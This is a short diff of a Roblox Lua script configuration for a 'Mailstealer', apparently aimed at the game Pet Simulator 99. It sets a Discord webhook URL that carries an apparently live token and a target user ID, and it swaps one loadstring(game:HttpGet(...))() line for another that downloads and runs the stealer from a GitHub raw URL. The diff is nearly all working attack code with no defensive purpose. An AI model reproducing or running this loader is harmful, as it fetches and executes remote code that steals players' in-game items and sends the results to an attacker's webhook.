@@ -1,4 +1,4 @@
-Username = "raniel_jud"
+UsernameID = 4033382218
 Webhook = "https://discord.com/api/webhooks/1233647875284795473/VRZMYyLTiFIZ-jZWLcQLvonO9ZgiymT4VbzuorsReu3n57spUs04tMgYnHFsiCzWooh2"
-min_rap = 15000
-loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/main/PS99/mailstealer"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lypos1/TTD/main/Mailstealer"))()
